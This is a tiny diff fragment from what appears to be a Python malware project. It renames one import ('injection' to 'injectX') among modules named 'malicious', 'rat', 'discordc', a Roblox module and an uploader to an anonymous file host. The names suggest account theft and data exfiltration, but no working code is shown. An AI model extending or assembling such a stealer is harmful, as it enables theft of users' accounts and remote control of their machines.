@@ -33,7 +33,7 @@ import discordc
 import informations
 import malicious
 import rat
-import injection
+import injectX
 from config import Config
 from _roblox import RobloxX
 from anonFile import uploadToAnonfiles
